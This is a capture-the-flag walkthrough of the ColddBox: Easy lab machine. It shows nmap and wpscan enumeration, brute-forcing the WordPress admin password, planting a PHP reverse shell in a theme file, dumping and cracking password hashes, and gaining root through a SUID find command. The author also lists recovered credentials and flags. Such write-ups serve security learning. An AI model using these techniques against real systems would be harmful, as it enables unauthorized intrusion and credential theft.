+++
title = "ColddBox - Walkthrough"
date = "2026-07-20"
author = "nvru"
description = "Walkthrough for the ColddBox: Easy machine."
tags = [
  "ctf",
  "walkthrough",
  "linux",
  "wordpress",
  "wpscan",
  "password-bruteforce",
  "php-reverse-shell",
  "suid",
  "privilege-escalation",
  "easy"
]
draft = false
+++

## Overview

- **Attacker IP:** `10.245.58.142`
- **Target Machine IP:** `10.245.58.242`

The objective was to enumerate the target, gain initial access by compromising a vulnerable WordPress installation, and escalate privileges by abusing a misconfigured SUID binary.

![Machine information](/images/vulnhub/colddbox/ss.png)

---

## Enumeration

### Port Scanning

#### RustScan

```bash
rustscan -a 10.245.58.242
```

Output:

```text
Open 10.245.58.242:80
Open 10.245.58.242:4512
```

#### Nmap

```bash
sudo nmap -sSCV -A -p80,4512 -oN nmap/ports 10.245.58.242
```

Results:

```text
PORT     STATE SERVICE VERSION

80/tcp   open  http    Apache httpd 2.4.18 (Ubuntu)
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10

HTTP Title: ColddBox | One more machine
WordPress 4.1.31
```

Only two TCP ports were exposed: HTTP on port **80** and SSH on port **4512**.

---

### WordPress Enumeration

Browsing to the website revealed a standard WordPress installation with nothing immediately interesting.

After performing directory brute forcing, I discovered a hidden directory:

```text
hidden/
```

Visiting the directory displayed a short message containing three names that looked like potential usernames:

```text
C0ldd
Philib
Hugo
```

These names appeared to be useful for further WordPress enumeration, so I proceeded to verify whether they were valid users.

![Hidden Directory](/images/vulnhub/colddbox/hidden.png)

---

### User Enumeration

Using WPScan, valid usernames were identified.

```text
philip
C0ldd
```

The administrator account (**C0ldd**) was then targeted with a password brute-force attack.

```bash
wpscan --url http://10.245.58.242 \
-P ~/wordlists/rockyou.txt \
-U creds/users
```

Successful credentials:

```text
C0ldd : 9876543210
C0ldd : iluvrich
```

The password **9876543210** successfully authenticated to the WordPress admin panel.

![WordPress Admin](/images/vulnhub/colddbox/log_wp_admin.png)

---

## Initial Access

After logging into the WordPress dashboard as **C0ldd**, I uploaded the PentestMonkey PHP reverse shell by modifying a theme file.

![Uploading Reverse Shell](/images/vulnhub/colddbox/put_rev_shell.png)

Triggering the modified page executed the payload and provided a shell as **www-data**.

![Reverse Shell](/images/vulnhub/colddbox/rev_www_data.png)

---

## Privilege Escalation

### Enumerating WordPress

The first file inspected was the WordPress configuration.

```bash
cat wp-config.php
```

Database credentials were recovered.

![Database Credentials](/images/vulnhub/colddbox/mysql_config.png)

Since MySQL was running locally, I connected using the recovered credentials and extracted the WordPress user hashes.

```text
c0ldd:$P$BJs9aAEh2WaBXC2zFhhoBrDUmN1g0i1
hugo:$P$B2512D1ABvEkkcFZ5lLilbqYFT1plC/
philip:$P$BXZ9bXCbA1JQuaCqOuuIiY4vyzjK/Y.
```

After cracking the hashes with John the Ripper:

```text
c0ldd : 9876543210
hugo  : password123456
```

Although additional credentials were recovered, they did not lead to privilege escalation.

![Recovered Hashes](/images/vulnhub/colddbox/hashes.png)

---

### Abusing a SUID Binary

Continuing local enumeration, I searched for SUID binaries.

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

Among the results was an unusual entry:

```text
/usr/bin/find
```

The `find` binary had the SUID bit set.

According to GTFOBins, `find` can be abused to execute commands with elevated privileges when it has the SUID permission.

Running:

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

spawned a root shell.

![Root Shell](/images/vulnhub/colddbox/root.png)

---

## Credentials

```text
WordPress

C0ldd:9876543210

Recovered

hugo:password123456
```

---

## Flags

### User

```text
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

Decoded:

```text
Felicidades, primer nivel conseguido!
```

### Root

```text
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```

Decoded:

```text
¡Felicidades, máquina completada!
```
